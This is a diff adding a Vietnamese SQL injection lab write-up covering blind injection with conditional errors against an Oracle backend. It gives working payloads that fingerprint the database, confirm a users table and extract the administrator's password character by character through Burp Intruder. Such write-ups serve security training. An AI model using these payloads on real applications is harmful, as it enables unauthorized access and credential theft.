@@ -582,5 +582,74 @@ Sử dụng hàm `SUBSTRING()` để lấy kí tự tại vị trí cần lấy:
 
 Lấy kết quả, nối chúng lại theo đúng vị trí. Đăng nhập với tư cách `administrator`.
 
+
+### Blind SQL injection with conditional errors
+> Mục tiêu: đăng nhập với tư cách `administrator`.
+
+Điều kiện như câu ở trên nhưng ứng dụng không trả về `Welcome back` mà trả về `Internal Server Error`.
+
+#### Check type error
+Ở đây không thể sử dụng payload `abc' OR 1=1` để kiểm tra, vì trong trường hợp này **server** chỉ trả về lỗi cú pháp, không trả về lỗi truy vấn. Bạn có thể thử bằng payload `abc' OR 1=2`, thực sự không có lỗi.
+Sử dụng payload `abc'` sẽ thấy **server** trả về lỗi, nhưng nếu là `abc''` thì kết thúc lỗi, truy vấn sẽ trở thành như sau:
+```sql
+SELECT ... FROM cookies WHERE TrackingId='abc'' # abc'
+SELECT ... FROM cookies WHERE TrackingId='abc''' # abc''
+```
+
+> Ý tưởng khai thác cũng như ở lab trên nhưng sử dụng tín hiệu là `error` trả về thay về `Welcome back`.
+
+#### Check type database
+Payload:
+```
+abc'||(SELECT '' FROM dual)||'
+```
+Chèn vào câu lệnh SQL có phép nối chuỗi `||`, sử dụng `FROM dual` để biết nó có phải `Oracle` database không, ở đây là `Oracle`.
+
+#### Check users table is exist
+Payload:
+```
+abc'||(SELECT '' FROM users WHERE ROWNUM=1)||'
+```
+- Nếu không lỗi, có thể bảng users tồn tại.
+- ROWNUM = 1: Giới hạn để chỉ lấy 1 dòng (tránh lỗi khi `concat` quá nhiều dòng → `Oracle` sẽ lỗi).
+
+#### Get administrator's password length
+Payload:
+```
+xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+Sử dụng truy vấn có điều kiện trong Oracle:
+- Nếu `(1=1)` thì `SELECT TO_CHAR(1/0)` hoặc `SELECT '' FROM dual`
+- Điều kiện `(1=1)` đúng nên sẽ `SELECT TO_CHAR(1/0)`, xuất hiện lỗi chia cho 0 nên **server** xuất ra lỗi.
+
+Payload:
+```
+xyz'||(SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+- Thay `(1=1)` bằng `LENGTH(password) > 1` 
+- Thay `dual` bằng `users` vì ta cần tìm dữ liệu trong bảng `users`
+- Không cần sử dụng `ROWNUM` vì đã giới hạn `record` bằng `username='administrator'`
+- Sử dụng **Burp Intruder** để tự động hóa quá trình tấn công, tăng dần `number` từ 1 tới 30
+- Thêm `Internal Server Error` vào `Grep-Match`
+- Vị trí cuỗi cùng xuất hiện là độ dài của `password`
+
+#### Get administrator's password
+Tương tự như lab trên ta check điều kiện ở từng vị trí của password
+Payload:
+```
+xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+- Chọn chế độ `Cluster bomb attack` để tấn công tổ hợp
+- Vị trí `1 - 1` chọn `Numbers`: From 1 - To password length - Step 1
+- Vị trí `1 - a` chọn `Brute forcer`: Min length = Max length = 1
+- Thêm `Grep-Match` như trên.
+- Start attack
+- Lọc kết quả và nối theo đúng thứ tự
+
+
+### Lab: Visible error-based SQL injection
+
+
 ---
 Goodluck! 🍀🍀🍀
